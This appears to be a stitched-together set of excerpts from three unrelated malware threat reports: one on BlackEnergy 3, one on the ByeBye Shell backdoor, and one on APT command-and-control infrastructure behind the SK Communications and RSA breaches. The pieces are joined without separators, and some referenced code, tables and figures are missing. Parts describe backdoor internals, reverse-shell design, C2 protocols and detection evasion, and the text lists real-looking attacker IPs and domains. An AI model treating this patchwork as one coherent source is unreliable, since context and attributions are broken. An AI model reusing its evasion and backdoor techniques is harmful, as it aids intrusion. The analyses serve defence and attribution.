This variant uses a new configuration format .
The configuration data is a series of X509_ASN encoded values and are accessed by an ID number .
Table 4 summarizes the fields and their equivalent BlackEnergy 2 XML node , while table 5 lists the completely new set of commands used in this latest variant .
Since the main DLL component offers little clue as to what the malware was used for , we need to look at the plugin to determine the objective of the gang .
One particular plugin that was used in the campaign was called `` si '' , perhaps to mean ' steal information ' .
The latest sample we found will attempt to gather the following information and send them to the C & C server : The nature of the information being gathered seems to be generic rather than targeted .
This may be because the malware has roots from crimeware .
The information is still useful however as such data makes it easier for the gang to plan any further attacks on the same targets .
Main DLL process configuration data embedded 1 in its body ; will only process fields related to communication .
Main DLL processes the configuration data 3 returned by the C & C .
This time , it processes fields related to plugins and commands .
For the BlackEnergy 2 samples used by the gang , the request contains the following fields : Where : • bot_id is equivalent to the infected host name and the volume serial number following the format x [ host_name ] _ [ serial_no ] ( e.g .
The actual bot_id string in which the i d hash is derived is also a bit different ; it now uses the format [ domain_sid ] _ [ host_name ] _ [ serial_no ] .
The response of the command and control server will be encrypted using the i d field in the POST request as the key .
After the response is decrypted , it will be in the form of the corresponding configuration data of the BlackEnergy sample ; for example , BlackEnergy 2 samples expect the decrypted response to be a XML document , while BlackEnergy 3 samples expect the decrypted response to be a series X509_ASN encoded values .
The decrypted response , which is equivalent to another configuration data , will be processed similar to the initial configuration data embedded in the main DLL ; the only differences are the data fields that are processed .
This cycle is illustrated in diagram 3 ( above ) .
The main DLL also uses the fields listed in table 6 ( above ) when it needs to download additional files .
In the summer of 2014 , we noted that certain samples of BlackEnergy malware began targeting Ukranian government organizations for information harvesting .
These samples were identified as being the work of one group , referred to in this document as `` Quedagh '' , which has a history of targeting political organizations .
Though inconclusive , suggestive details indicate that BlackEnergy malware , possibly also from this gang , may also have been used in the Russo - Georgian confrontation in 2008 .
The Quedagh - customizations to the BlackEnergy malware include support for proxy servers ( which , in the samples examined are associated with Ukrainian entities ) and use of techniques to bypass User Account Control and driver signing features in 64-bit Windows systems .
While monitoring BlackEnergy samples , we also encountered a new variant , which we dub BlackEnergy 3 , with a modified configuration , no driver component and a different installation procedure .
The use of BlackEnergy for a politically - oriented attack is an intriguing convergence of criminal activity and espionage .
As the kit is being used by multiple groups , it provides a greater measure of plausible deniability than is afforded by a custom - made piece of code .
All Places > Information Security > Blog > 2013 > August > 19 Information Security Posted by Claudio Guarnieri in Information Security on Aug 19 , 2013 2:10:45 PM Asia and South Asia are a theater for daily attacks and numerous ongoing espionage campaigns between neighboring countries , so many campaigns that it 's hard to keep count .
Recently I stumbled on yet another one , which appears to have been active since at least the beginning of the year , and seems mostly directed at Pakistani targets .
In this article we 're going to analyze the nature of the attacks , the functionality of the backdoor - here labelled as ByeBye Shell - and the quick interaction I had with the operators behind this campaign .
No exploit was used in any of the attacks we attribute to this campaign - the attackers probably just relied on social engineering the victim through well - crafted spearphishing emails .
The malware first appears to the victim as a .scr
In some cases the attackers make use of the Left - to - Right Override Unicode character in order to twist the .exe
Once executed it drops and launches a batch script in a % Temp % subfolder with the following content : As you can see , it enforces some configuration in the registry in order to hide file extensions and not show hidden folders .
Subsequently the malware creates and launches a Cabinet Self - Extractor , which drops two additional executable files : one embedding either a PDF or a Microsoft Office Word document , the other being the actual backdoor .
These are the hashes of the original droppers I inspected during this analysis : The embedded documents all show content revolving around internal or foreign Pakistan politics - following are some examples of such documents : Let 's face it : at the point where the attackers obtain control over the target computer , not much sophistication is left in day - to - day targeted attacks .
This campaign is no exception .
The main backdoor installed and executed on the victims ' systems appears to be a custom reverse shell with just a handful of features .
Due to a lack of public literature about this case , I decided to dub this family as ByeByeShell .
When disassembling the binary you can quickly understand the mechanics of the backdoor .
After some quick initialization , the backdoor XORs an embedded string with 0x9D to extract the IP address of the C & C server .
Subsequently it establishes a connection to it ( generally on port 80 ) and checks in with some basic information about the system .
As you can see , it reports the computer name , the user name , the IP address and MAC address of the network adapter .
The [ P130813 ] line appears to be a constant value , possibly a target identifier .
Interestingly , in a specific malware sample belonging to this campaign , the backdoor also appends the string `` INS and AfPak '' at the end of the message - note that , as defined by Wikipedia , `` AfPak ( or Af - Pak ) is a neologism used within US foreign policy circles to designate Afghanistan and Pakistan as a single theater of operations '' .
After the check - in message is sent , the malware enters a continuous loop in which it will keep silently waiting for commands from the open socket connection .
From now on , it expects some manual interaction from the attacker .
The supported commands are : shell , comd , sleep , quit , kill You can see the switch block in the following screenshots .
In the following screenshot you can see how the reverse shell is implemented : it just launches a cmd.exe and pipes stdin , stdout and stderr to the opened socket so that the operator can directly interact with the Windows prompt .
The samples are also signed with an invalid Microsoft Windows certificate , which can be used for further fingerprinting : In all the cases presented in this blog post , the backdoors tried to connect to the C & C located at 46.165.207.134 , which appears to be a dedicated server hosted by Leaseweb : At the time of writing , the server appears to still be online .
However port 80 , which the backdoors try to contact , appears to be available only sporadically .
In order to get some fun out of an overall straightforward analysis , I quickly hacked together a Python script that emulates a ByeBye backdoor - following is the code : As you can see , this script simply tries to emulate the basic functionality of ByeBye : it performs the initial check - in and waits for incoming messages from the operator .
Yes - since , as previously said , the C & C comes online only at times - I instructed the script to play an extremely loud alarm .
Props to my flatmate for waking me up whenever the alarm went off .
Surprisingly the operator responded few moments later my first attempt , although he quickly tried to terminate me probably noticing an unexpected origin : Unfortunately at that time I did n't have the script completed , therefore he noticed something odd and closed my connection .
I let a few days pass , completed the script and prepared a more credible scenario : a legitimate looking system connecting out of South Asia .
This time it took a bit longer to get some response from the operator , who simply tried to search for documents on the system : Sadly no further activity was observed .
This is yet another case of poorly skilled attackers managing to run successful espionage campaigns for extended periods of time .
This is probably one of the most basic incidents I encountered so far , but we can safely assume that the operators behind this campaign are successful enough to maintain the operations running for at least the last 6 months , possibly even more .
No clear indicator is available to make an informed estimate on what could be the origin of the attacks .
This paper presents the findings of an extensive investigation into command and control infrastructure used by an Advanced Persistent Threat .
Findings include technical details of malicious software , and associated command and control protocols .
These findings are drawn upon to identify modus operandi and demonstrate links between a number of major targeted attacks including the recent Sykipot attacks , the July 2011 SK Communications hack , the March 2011 RSA breach , and the series of coordinated cyber attacks dubbed NightDragon .
This paper discusses malicious activity and identifies Internet Protocol ( IP ) addresses , domain names , and websites that may contain malicious content .
For safety reasons these locations should not be accessed , scanned , probed , or otherwise interacted with unless their trustworthiness can be verified .
On 28 July 2011 SK Communications announced it had been the subject of a hack which resulted in the theft of the personal details of up to 35 million people .
The attackers infected a number of SK Communications computers with malicious software ( malware ) and , by issuing command and control ( C2 ) instructions to the malware , were able to gain access to , and exfiltrate large quantities of data .
The attack itself was complex , well planned and likely part of a broader , concerted hacking effort attributable to an Advanced Persistent Threat .
The malware used in the attack was programmed to communicate with several ' callback ' domains .
The malware located its C2 server ( s ) by resolving these domains into IP addresses using the ubiquitous Domain Name System ( DNS ) protocol .
These communications are depicted in Figure 1 .
One of the callback locations used in the SK Communications hack was ' update.alyac.org ' .
The domain was registered on 24 September 2010 using registration information almost identical to that of a legitimate company – a tactic used by the attacker on several occasions .
Following the intrusion into the SK Communications network it became widely known that the domain was being used for malicious purposes , and perhaps for this reason , the one year registration was not renewed by the attacker .
Despite this , a number of victims around the world continued to use the domain to locate their C2 server , resulting in attempted communications to a C2 server that no longer exists .
Computers using IP addresses allocated to France , the People 's Republic of China , Portugal , South Korea , Taiwan , the United Kingdom and the United States are among those that attempted to communicate with ' alyac.org ' subdomains after the attacker 's registration lapsed in September 2011 .
While some of these computers belong to security researchers who deliberately installed malware for research purposes , most are victims compromised by the attacker either directly or indirectly .
The victims are from a variety of industries including the technology sector , high precision manufacturing , research and development , testing and certification , global market research , executive headhunting and mentoring , and webhosting providers .
Eight different types of C2 communications were observed to ' alyac.org ' subdomains from the compromised computers .
These communication types will be referred to as ' LURK ' , ' X­Shell C601 ' , ' Update ? ' , ' Murcy ' , ' Oscar ' , ' BB ' , ' DB ' , and ' Qdigit ' respectively .
Several victims communicated via both ' Update ? ' and ' Oscar ' which are believed to be associated with the same malware .
No other victims were observed communicating with ' alyac.org ' subdomains via more than one C2 protocol .
A single computer was observed communicating with the callback domain ' path.alyac.org ' on Transmission Control Protocol ( TCP ) 80 via the ' LURK ' protocol .
The communications contained a 15­byte header followed by data compressed using the DEFLATE compression method .
The header contained a protocol identifier , size and compression information as shown in Table 1 .
The decompressed data reveals information about the compromised computer such as its name , computer specifications and operating system ( OS ) information as shown in Table 2 .
For example , it reveals that the compromised computer communicating with ' path.alyac.org ' is running Windows 2003 Server Web Edition , Service Pack 2 .
Similar communications are known to be generated by malware that communicates with the callback domain ' office.windowupdate.org ' – a domain that is linked to ' alyac.org ' not only by the communications protocol but also by both domain registration tactic and infrastructure .
The domain ' windowupdate.org ' is ostensibly registered to ' Microsoft Corporation ' .
The administrative address and contact information listed in the domain registration is identical to that listed for the legitimate Microsoft domain ' windowsupdate.com ' .
This is the same tactic used by the attacker with registration of ' alyac.org ' .
The domain ' windowupdate.org ' previously pointed to South Korean IP address 222.122.20.241­ an IP address to which ' alyac.org ' also previously pointed .
This shared infrastructure further suggests that the observed communications to ' path.alyac.org ' and those to ' office.windowupdate.org ' may be linked to the same attacker .
The malware that generates the LURK communications sent to ' office.windowupdate.org ' was signed using a compromised code signing certificate belonging to YNK Japan Inc – a producer of online games .
The same certificate has been used in a number of attacks including by Hupigon malware and malware similar to that used in the SK Communications hack .
Details of the compromised code signing certificate are shown in Figure 2 .
The new date of effect still may not prevent the validation of all malware using this compromised code signing certificate .
Numerous compromised computers communicated with ' path.alyac.org ' on TCP port 443 ­a port commonly used for SSL .
These communications , however , were not SSL but instead unencrypted communications likely generated by a version of the command­line based ' X­Shell 601 ' Remote Administration Tool ( RAT ) .
A summary of the observed X­Shell communications , and the information they reveal about the compromised computer , is shown in Table 3 .
The ' C ' immediately preceding the ' 601 ' in the communications is believed to indicate that the malware is not a free version but instead a custom , or commercial , version of the X­Shell 601 RAT .
In all observed communications the process name listed at byte 288 was ' svchost.exe ' .
Based on this , the malware has likely modified the system registry on the compromised computers in such a way that the RAT gets executed as a service by the trusted process ' svchost.exe ' each time the computer is started .
This process name , along with the callback location , is configurable , and can be configured after the RAT has been compiled into executable form .
While X­Shell supports numerous versions of the Windows OS ( including Windows XP , Vista , Windows 7 , and Windows 2000 , 2003 and 2008 server ­ both 32 and 64 bit versions ) , only computers running Windows XP were observed communicating with ' path.alyac.org ' .
The functionality of the RAT depends on the version , release number , plugins installed and the OS on which the RAT is installed .
Several versions of the X­Shell RAT exist , including a free version and a ' spy ' version .
The free version of the RAT is no longer available for download from the XDoors website , however , development of the software continues .
Current release numbers of the X­Shell RAT include 601 and 603 .
Previous releases date back to at least 2006 .
Some functionality comes standard in all versions of the RAT including the ability to start a command shell , control processes and services , upload / download files , terminate TCP connections , create user accounts , retrieve system information , log user activity ( via a keylogger ) , modify timestamps on files , conduct process injection , conduct denial of service attacks and shutdown or restart the computer .
Commands supported by the X­Shell software are listed in Annex C. ( XTiger ) The RAT is Virtual Machine ( VM ) aware , proxy aware and can also use a specified DNS server to resolve callback domains .
Some versions have rootkit functionality and can avoid detection by antivirus software .
Optional features include encrypted file search , an SMS notification service , and functionality that enables the compromised computer to be used as part of a botnet to send spam or to conduct distributed denial of service attacks .
This broad range of functionality makes the software fit for a number of purposes and reflects the commercial nature of the software .
The control program can be run in either Chinese language mode or English language mode , and allows the malware to be easily configured .
It provides options to digitally sign the malware , specify its connection mode ( connect / listen / sniff ) , install the malware in one of several covert manners , recover the System Service Dispatch Table ( SSDT ) before installation , and abort installation if a virtual machine is detected .
Additionally , an option can be selected during the generation process to actively notify the malware of a new C2 host and port via a configuration webpage .
If this option is selected , the malware communicates with both a configuration webpage , and a C2 server at regular intervals .
The interval for each can be separately configured to a value of between 30 and 3600 seconds ( inclusive ) .
It is not known whether the malware was configured solely with a static C2 host or whether the malware also retrieves its C2 host and port from a configuration webpage .
X­Shell configuration webpages contain , in encoded form , a colon­separated IP address ( or callback domain ) and port for the malware to use to communicate with its C2 server .
The encoded IP address ( or callback domain ) and control port can be decoded one byte at a time using the formula : where i is the byte index , di is the decoded byte , ei is the encoded byte and x is a one byte key .
This is the equivalent of subtracting both the key and the byte position number [ 0­7 ] from each byte .
The position number is modulo 8 i.e .
For example , if the compromised computers received a C2 host of ' PATH.ALYAC.ORG ' and a control port of 443 from a configuration webpage , and a key of 0x16 ( 22 in decimal ) was used to encode the control information , the configuration webpage would have contained the encoded string ' fXlaH\hvWZFhlbVQJJ ' .
Two request formats were observed ; Variant A ( shown in Figure 3 ) in which the file path requested was ' /update ? product = windows ' , and Variant B ( shown in Figure 4 ) in which the file path requested was ' /update ? id = number ' , where number refers to an eight digit hexadecimal number that changes between requests .
The domain ' path.alyac.org ' only received Variant B requests , while both variants were sent to ' update.alyac.org ' .
The format of Variant A is identical to the communications generated by the Destory RAT used in the SK Communications hack .
The format of Variant B is identical to the communications generated by malware that uses the callback domain ' gm1.network­sec.net ' .
Both variants are associated with the Destory RAT family of malware that dates back at least as far as January 2007 and has been used in several major targeted attacks .
The Destory RAT family includes malware that is detected as : Backdoor . Sogu , Backdoor : Win32/Thoper . A , Trojan . Downloader : Win32/Thoper B .
The observed communications to the ' alyac.org ' subdomains all occurred on TCP port 80 , however , a variety of ports ( TCP ports 8080 , 443 , 12345 etc .
The port used depends on how the malware is configured .
Connection attempts from each of the compromised computers occurred frequently while the computers were powered on .
For example , one computer connected at 16 second intervals and another approximately every 200 seconds ( ±15 seconds ) .
Three HTTP POST requests were submitted during each connection , each approximately one second apart .
The following malformed user­agent is present in the HTTP POST requests of both variants ( spaces shown here as ' · ' ) : ' Mozilla/4.0· ( compatible ; ·MSIE·6.0 ; ·Windows·NT·5.1 ; SV1 ; ' This user­agent is consistent with that which may be generated by version 6.0 of the Microsoft Internet Explorer web browser running on the Microsoft Windows XP OS , except that it is missing a closing bracket after the last semicolon and a space after the second to last semicolon .
This malformed user­agent is hardcoded into the malware and can be used as a signature to detect the communications .
Four custom headers are also present in the HTTP requests : ' X­Session ' , ' X­Status ' , ' X­Size ' , and ' X­Sn ' .
For some malware in the Destory RAT family not all of these headers will be present .
Cookies were sent with the HTTP POST requests from all but three IP addresses .
A cookie named ' VistorID ' was present any time a cookie was sent .
On occasion a ' Yahoo ' , ' SessionId ' and/or ' fcVal ' cookie was also present in the requests .
The transmission of these cookies could facilitate session stealing and , in the case of the Yahoo cookie , enable unauthorised webmail access .
Each VisitorID cookie contained an expiry time between 9/25/2014 5:50:03 AM and 9/25/2014 6:14:17 AM .
The expiry time is unique for each victim and remained constant ( per victim ) across the HTTP POST requests .
It is possible the victims received the cookie from a C2 server with which they had previously communicated , or , from a server hosting a webpage that caused the initial infection .
It is also possible that the cookie , and the propinquity of the times in the cookies , is coincidental , and that the victims received the cookie from other locations .
Multiple Chinese IP addresses were observed submitting HTTP GET requests to the host ' path.alyac.org ' .
Data contained within the communications indicated that the requests were all sent from a single computer , and therefore that computer was not using a static IP address .
The data from the computer was carried in the requests in an encoded form ( as described below ) within a HTTP header named ' Extra­Data ' .
Two other unique headers were also present in the requests ; ' Extra­Data­Bind ' and ' Extra­Data­Space ' .
The communications appear to be generated by malware known as ' Backdoor . Murcy ' that is reportedly not in widespread use .
An example of an actual HTTP GET request is shown in Figure 5 .
The path in the HTTP GET requests is the computer 's tick count ( i.e .
The requests from the victim occurred approximately every 11 seconds when the computer was turned on .
Accordingly , the number in the URI increased by approximately 11000 each request .
Where there was a break in the communications ( presumably due to the computer being shut down or rebooted ) , the counter reset and was between 128703 and 133243 in the next communication .
This indicates that the malware began communicating from this compromised computer within minutes of the computer being booted .
The encoded data within the ' Extra­Data ' header can be decoded using the standard Base64 alphabet but with modified bit placement .
The standard Base64 algorithm decodes encoded strings using consecutive bits read left to right i.e .
For Murcy communications , the input bits that form each output byte are not taken contiguously .
Figure 7 describes how the first three decoded bytes are constructed , and can be used to implement a decoding algorithm .
For some input data sizes a crude , but functionally equivalent , approach is to reverse the input bytes , apply a standard Base64 decoding , and then reverse the output bytes .
The decoded string contains communications of a format hereon referred to as the ' IP2B ' protocol .
All observed IP2B communications began with a 16 byte header containing the hexadecimal values 0x12345678 and 0x10001000 , and the size of the data .
The decoded version of the Murcy ' Extra­Data ' string from Figure 5 is shown in Figure 8 .
The decoded data reveals the name of the compromised computer , that the computer is running Windows XP Service Pack 3 , its internal IP address is 192.168.132.30 , its screen resolution is set to 1920x1080 and that its locale is ' Chinese ­ China ' .
A summary of each byte in the observed communications is provided in Table 4 .
The data sent to the C2 server is dependent on the C2 instructions received .
Commands the Murcy malware reportedly understands are shown in Annex D. ( SafeZoneCast , 2011 ) The Murcy malware is commonly named ' cydll.dll ' , creates a mutual exclusion ( mutex ) handle named ' Cy1.0Mutex ' , and installs a service named ' CyService ' with a display name of ' CyService Service ' .
It also commonly gains persistence by creating the registry key ' ServiceDll = % System % \cydll.com ' in the ' ControlSet001 ' key in the Local Machine hive of the Windows registry .
Symantec Corporation discovered Backdoor . Murcy on 31 July 2011 , yet the same malware appears to have been first detected by Kaspersky Lab on 11 January 2010 .
Malware samples with the same attributes date back to at least October 2009 .
This suggests that the Murcy malware has been in use for at least two years .
Known Murcy malware uses the callback domains ' albertstein.ddns.us ' , ' alvington.jetos.com ' , ' ftp.xmahone.ocry.com ' , and ' superaround.ns02.biz ' .
These callback domains were all also reportedly used in the March 2011 intrusion into RSA 's network .
That intrusion resulted in the theft of information related to RSA 's SecurID two­factor authentication products .
The stolen information was later used to enable targeting of defence contractors .
Numerous computers were observed communicating with an ' alyac.org ' subdomain on TCP port 80 via the ' Oscar ' protocol .
Most , but not all , of the computers also communicated to the same domain via the ' Update ? ' communications .
The protocol is believed to be associated with the same malware that produces the ' Update ? ' communications – the Destory RAT .
Each compromised computer communicated at a different interval to the others , and accordingly , the malware on each of the compromised computers appears to have been individually configured .
For example , one computer communicated every 12 seconds and another every 16 seconds .
Encrypted data was sent during each communication .
The length of the encrypted data in each packet varied between 16 bytes and 89 bytes .
After sending the encrypted data the malware waited for a response .
Two computers were observed communicating with ' update.alyac.org ' via the ' BB ' protocol .
One of the computers used a Chinese IP address , the other a South Korean IP address .
The ' BB ' protocol has a 21 byte header containing a 4 byte XOR key that can be used to decode the remaining bytes in the packet .
The packet format is described in Table 5 .
Once decoded , the data reveals a basic beacon containing the computer name and IP address of the infected computer .
After sending the basic beacon , the compromised computers waited for a response from the server , then closed the connection when they had not received a response from the server within five seconds .
Both of the compromised computers reattempted the communications approximately every eight seconds .
On some days the high frequency of the beacon activity resulted in over 10000 connection attempts per victim in a 24 hour period .
A single computer was observed communicating with the domain ' update.alyac.org ' via the ' DB ' protocol .
The communications originated from the same Chinese computer network as one of the ' BB ' victims but from a different computer on that network .
It is not known what malware generates the ' DB ' communications , or whether it is the same malware that generates the ' BB ' communications .
The communications reveal detailed OS and system information about the compromised computer as shown in Table 6 .
The OS information reveals that the compromised computer is running Windows 2003 Server Service Pack 2 .
The detailed system information reveals that the compromised computer has an Intel Pentium Pro­class processor , four logical processors and an LGA 775 Central Processing Unit ( CPU ) socket .
The DB communications typically occurred at intervals of between 4 and 92 seconds , however , sometimes they were much further apart .
After sending the detailed beacon to the command and control server , the compromised computer appeared to expect a response from the server .
One computer using a static South Korean IP address was observed sending the five bytes 0x51 0x31 0x39 0x21 0x00 ( `` \x51Q19 ! '' ) to ' update.alyac.org ' on TCP port 80 up to nearly 800 times a day .
While the communications did not occur continuously ( likely due to the computer being turned off ) , when they did occur a new connection was attempted , and the packet containing ' Q19 ! ' sent , approximately every minute .
It is assumed these communications are generated by malware but it is not known what malware , or which other callback domains that malware uses .
The malware appeared to expect a response from the server after it sent each packet .
The communications to ' alyac.org ' subdomains occurred frequently from each compromised computer .
A summary of typical observed intervals between communications , broken down by protocol , is shown in Table 7 .
The single LURK victim was typically observed beaconing at 26 second intervals , the Murcy victim at 11 second intervals , and the Qdigit victim at 60 second intervals .
All of the X­Shell C601 victims were typically observed beaconing at 36 second intervals , and the BB victims at 8 second intervals .
The beaconing interval of the other victims does not appear to be a fixed time , and instead a degree of randomness appears to be employed .
As shown in Table 8 , the observed communications all occurred on TCP port 80 or TCP port 443 ­ ports commonly used for legitimate purposes .
While most malware uses the local DNS server settings of the compromised computer to resolve its callback domain to an IP address , in some observed communications the attackers appear to have specifically chosen the DNS servers .
The majority of X­Shell C601 malware that called back to ' path.alyac.org ' used Google DNS servers , presumably instead of the DNS settings on the compromised computers .
The X­Shell C601 malware supports use of a specified DNS server to resolve callback domains , and it appears the attackers have made use of this functionality .
The ' Update ? ' , Oscar , Murcy and Qdigit victims all appear to have used their local DNS server settings to resolve the callback domains .
On the other hand , the single LURK victim used Google DNS servers to resolve its callback domain , as did the Chinese BB victim ( and associated DB victim ) but not the South Korean BB victim .
This suggests that the LURK , BB and DB malware may also have the same DNS functionality as X­Shell , although it is possible that the victims are configured to use the Google servers as their regular DNS servers , and that the malware is not using different servers .
The observed communications have links to a variety of malware and to a number of attacks , as illustrated in Figure 9 , and detailed below .
The ' Update ? ' communications and the Oscar communications are both associated with the Destory RAT family of malware .
This malware family has been used in a number of targeted attacks including the July 2011 SK Communications hack .
Through shared infrastructure the malware has links to the series of coordinated , covert and targeted cyber attacks dubbed ' NightDragon ' , and also to the recent series of targeted attacks that have used ' Sykipot ' malware .
Through a shared callback domain the Destory RAT malware also has links to socially engineered emails including those that targeted experts on the relationship of the United States with Japan , China and Taiwan .
The Destory RAT is also connected to LURK malware via a compromised code signing certificate which was used to sign both pieces of malware , and to IP2B communications by a shared callback domain .
The X­Shell RAT has been used in numerous attacks but many of these attacks are not expected to be associated with the same attackers .
On the other hand , the callback domains used by Murcy malware suggest that the malware is used , perhaps solely , by the attackers responsible for the March 2011 RSA breach .
This includes activity involving callback domains registered to appear as though they were associated with legitimate , trusted entities , and domains registered to a ' Lee Cooper ' that tie back to the SK Communications hack .
Destory RAT malware is known to communicate with the callback domain ' vupdate.mail­kr2.com ' , while NightDragon malware is known to communicate with ' ma2.mail­kr2.com ' and ' www2.mail­kr2.com ' .
The communications sent to ' www2.mail­kr2.com ' are similar , but not identical , to IP2B communications , further linking the observed activity .
Other ' mail­kr2.com ' subdomains include ' cb85.mail­kr.com ' , ' sa****.mail­kr2.com ' , and ' skylie.mail­kr2.com ' ­ at least two of which are known to be associated with malware .
Destory RAT malware is known to use the callback domain ' bbs.afbjz.com ' , while known NightDragon malware uses the callback domain ' blog.afbjz.com ' .
As of 3 February 2012 , both of the subdomains point to US IP address 67.90.204.228 .
This overlap in infrastructure appears to be of particular significance given the following links between other activity on the same IP address .
As of 6 February 2012 , the domains ' gmail.mail­ ru2.com ' , ' live.mail­ru2.com ' , ' mail­ru2.com ' , ' msn.mail­ru2.com ' , ' usaisbig.oerco.com ' , ' whois.oerco.com ' , ' www.afbjz.com ' , and ' www2.oerco.com ' also point to IP address 67.90.204.228 .
At least one of these domains is otherwise known to be associated with malware .
The ' oerco.com ' domain is registered to the same person as ' afbjz.com ' , associating the two domains with a single entity .
The ' mail­ru2.com ' domain appears to be associated with the same entity as the ' mail­kr2.com ' domain used by NightDragon malware and the Destroy RAT ( as described above ) .
While the domains were registered using different details , they were registered on the same day through the same domain name registrar , and the records later updated minutes apart56 .
This suggests that all C2 activity involving IP address 67.90.204.228 may be associated with a single entity .
The recently expired domain ' todaygonever.com ' also previously pointed to the same IP address .
As will be discussed later in the paper , ' todaygonever.com ' is directly associated with malware and has links to the recent series of Sykipot attacks .
The recently expired domains ' goodfeelingauto.com ' and ' deadlinely.com ' also pointed to the same IP address and were likely associated with the same attackers .
Other Destory RAT callback domains are also otherwise linked to malicious activity .
For example , the callback domain ' www.adv138mail.com ' was used by a Poison Ivy RAT sent in a July 2011 socially engineered email campaign .
The emails contained an attachment , named ' Meeting Agenda.pdf ' , which attempted to exploit a vulnerability specified by the Common Vulnerabilities and Exposure ( CVE ) number 2010­ 2883 to install the Poison Ivy RAT .
A clean decoy PDF file was shown to the user when the attachment was opened .
A copy of the text used in the socially engineered email campaign is shown in Figure 10 .
The domain ' www.adv138mail.com ' is also associated with malware detected by antivirus software as ' Backdoor . Win32.Delf.abow ' .
Other known subdomains include : - ' asm.adv138mail.com ' , - ' dns.adv138mail.com ' , - ' ftp.adv138mail.com ' , - ' ihi.adv138mail.com ' , - ' nov.adv138mail.com ' .
These domains ( with the possible exception of the ' dns ' and ' ihi ' subdomains ) have all pointed to the same infrastructure as the domains ' pu.flower­ show.org ' and ' www.mailsignin.net ' .
That shared infrastructure is known to have been used to send socially engineered emails that contained an attachment named ' invtation.pdf ' [ sic ] .
Similar to the ' Meeting Agenda ' attachment , ' invtation ' installs a Poison Ivy RAT , but one configured to communicate with the callback domain ' pu.flower­show.org ' .
The text used in the emails is shown in Figure 11 .
In addition to having previously shared infrastructure with the known Destory RAT callback domain ' www.adv138mail.com ' , the domain ' www.mailsignin.net ' has also previously shared infrastructure with at least two other known Destory RAT callback domains .
The domain ' www.mailsignin.net ' previously pointed to IP address 175.45.22.220 , as did the known Destory RAT callback domains ' newhose.ntimobile.com ' and ' sms.servegame.com ' .
A number of subdomains of the Destory RAT­associated domain ' join3com.com ' also previously pointed to the same IP address .
These links suggest that many attacks in which the Destory RAT has been used are linked , not only by the malware , but also through C2 infrastructure .
This further supports the notion that the Destory RAT was developed by , or for , particular attackers and that most , if not all , of the malicious activity involving it is attributable to those attackers .
The Destory callback domains also have links to additional malware .
For example , the domain ' network­sec.net ' has been used by the Destory RAT ( ' gm1.network­sec.net ' ) , by Poison Ivy malware ( ' yoyo.network­sec.net ' ) and by ' Backdoor­FCQ ' ( ' pingabm.network­sec.net ' , ' ' psbm11025.network­ sec.net ' and ' psbm10.network­sec.net ' ) .
The observed LURK communications appear to be the same as those generated by malware that was digitally signed using a compromised code signing certificate that was used to sign a Destory RAT , and other malware used in several attacks .
That malware communicates with the domain ' office.windowupdate.org ' – a domain that is linked to ' alyac.org ' not only by the communications protocol but also by both domain registration tactic and infrastructure .
The callback domain previously pointed to the same IP address as that used in the SK Communications hack .
Both of the malicious files were compiled from the same code on 27 September 2010 at 09:17:04 Greenwich Mean Time ( GMT ) , and later configured .
The callback domain ' wow.travlman.com ' is also used by malware that produces ' IP2B ' communications of an identical format to those decoded from the ' Extra­Data ' in the Murcy communications .
This highlights an additional link between the Destory RAT and the IP2B communications .
Several other ' travlman.com ' sub­domains are known to exist including at least one that is associated with malware .
The sub­domain ' dm.travlman.com ' is the callback used by malware detected by antivirus software as ' Trojan : Win32/Boupke ' .
The majority of the known callback domains for Murcy malware were used in the March 2011 RSA breach .
This suggests that the attackers responsible for the RSA breach also use the Murcy malware .
Given that the malware is reportedly not in widespread use , the Chinese server communicating with ' path.alyac.org ' may have been compromised by the same attackers responsible for the RSA breach .
X­Shell RAT The X­Shell RAT is commercially available software that appears to have been used in a number of attacks .
There are numerous versions of the X­Shell RAT , and not all produce the same communications .
Malware that generates the same X­Shell C601 communications observed to ' path.alyac.org ' appears to have been used in a number of attacks .
Malware that generates similar communications also appears to have been used in a number of attacks .
That malware is thought to be an X­Shell C603 RAT and not an X­Shell C601 RAT .
It is not known whether any of these malicious files were used by the same attackers who used the X­shell malware which communicates with ' path.alyac.org ' .
The domain ' alyac.org ' previously pointed to a C2 server located at IP address 222.122.20.241 and another located at IP address 202.30.224.240 .
These IP addresses are associated with a number of other callback domains including ' bbs.ezxsoft.com ' , ' pc.nprotects.org ' , and ' wow.travlman.com ' ­ the latter being linked to both the Destory RAT and IP2B communications ( as previously discussed ) .
In addition to both having shared infrastructure with ' alyac.org ' , the two callback domains ' bbs.ezxsoft.com ' and ' pc.nprotects.org ' are used by malware that creates a uniquely named directory .
This indicates a direct relationship between the two pieces of malware .
The domain ' ezxsoft.com ' was registered by the same entity ( ' Lee Cooper ' ) as a domain used in the SK Communications hack ( ' ro.diggfunny.com ' ) , further linking it to the same attackers .
The C2 server and the callback domains also have links to a myriad of other malicious activity .
As previously discussed , before it expired , ' todaygonever.com ' pointed to a C2 server associated with both the Destroy RAT and NightDragon malware .
The same domain is also associated with Sykipot activity through shared C2 server infrastructure , and domain registration information .
Over its lifetime the domain ' todaygonever.com ' pointed to numerous IP addresses , many of which are not noteworthy as they were assigned to servers that hosted numerous websites .
Four of the IP addresses , however , are of particular note – IP addresses 67.90.204.228 ( as previously discussed ) , 67.79.149.90 , 209.133.72.83 and an IP address allocated to a large US financial institution .
Both IP address 67.79.149.90 and IP address 209.133.72.83 previously hosted ' bluelightness.com ' subdomains .
They therefore have additional links to Sykipot activity as ' shopping.bluelightness.com ' was previously hosted on IP address 209.53.155.244 ­ the same IP address as the known Sykipot domains ' www.topix21century.com ' and ' notes.topix21century.com ' .
The ' bluelightness.com ' domain is also linked to ' mail­kr2.com ' ­ a Destory RAT and NightDragon domain previously discussed .
Both domains share infrastructure with the domain ' worldsecuritys.com ' .
As of 6 February , the domains ' file.filesdelete.com ' , ' news.welldone123.net ' and ' well.welldone123.net ' all point to the IP address allocated to the large US financial institution ( to which ' todaygonever.com ' also previously pointed .
The domain ' filesdelete.com ' is also otherwise associated with malware .
The email address listed in the domain registration for ' todaygonever.com ' was ' janagreen2000 @ gmail.com ' .
The same contact email address ( but different name , address , and phone and fax numbers ) was also used in the domain registration for ' centurycpc.com ' , ' filesdelete.com ' , ' greenrightway.com ' , ' quicklyfindme.com ' , and ' newcarstyle.com ' – at least two of which are known Sykipot malware domains .
This has significant implications for network defenders .
Such requests , if allowed , will bypass the victim 's DNS servers and defeat any blacklists used by the victim 's own DNS servers .
Furthermore , the requests will not appear in the victim 's DNS server logs , making detection and investigation more difficult .
Furthermore they should be alert to any DNS communication attempts to locations other than the company 's own DNS servers , as this may be an indicator of a malware infection .
